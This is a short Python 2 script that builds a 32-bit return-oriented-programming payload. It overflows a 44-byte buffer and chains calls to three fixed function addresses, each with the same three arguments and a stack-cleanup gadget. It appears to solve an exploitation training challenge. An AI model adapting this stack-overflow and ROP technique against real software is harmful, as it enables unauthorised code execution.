import struct

def p32(addr):
    return struct.pack("<I", addr)

# add esp, 8; pop ebx; ret
gadget = 0x080484aa

# (alternative) pop esi; pop edi; pop ebp; ret
# gadget = 0x080487f9

call_one = 0x080484f0
call_two = 0x08048550
call_three = 0x080484e0

fst_arg = 0xdeadbeef
snd_arg = 0xcafebabe
trd_arg = 0xd00df00d

buffer_size = 44

payload = "\x90" * buffer_size + p32(call_one) + p32(gadget) + p32(fst_arg) + p32(snd_arg) + p32(trd_arg) + p32(call_two) + p32(gadget) + p32(fst_arg) + p32(snd_arg) + p32(trd_arg) + p32(call_three) + p32(gadget) + p32(fst_arg) + p32(snd_arg) + p32(trd_arg)
print payload
